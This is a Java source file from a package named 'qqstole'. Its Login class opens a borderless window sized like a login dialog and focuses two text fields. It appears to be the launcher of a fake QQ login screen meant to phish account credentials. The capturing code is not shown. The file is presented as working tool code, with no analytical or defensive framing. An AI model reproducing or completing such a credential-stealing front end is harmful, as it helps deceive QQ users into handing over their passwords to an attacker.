package qqstole;

import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.IOException;

public class Login {
   public static void Run() throws IOException {
      QQFrame frame = new QQFrame();
      frame.setUndecorated(true);
      frame.setSize(428, 331);
      frame.setVisible(true);
      frame.setLocation(464, 219);
      frame.addWindowListener(new WindowAdapter() {
         public void windowOpened(WindowEvent evt) {
            QQFrame.text2.requestFocus();
            QQFrame.text1.requestFocus();
         }
      });
   }

   public static void main(String[] args) throws IOException {
      Run();
   }
}
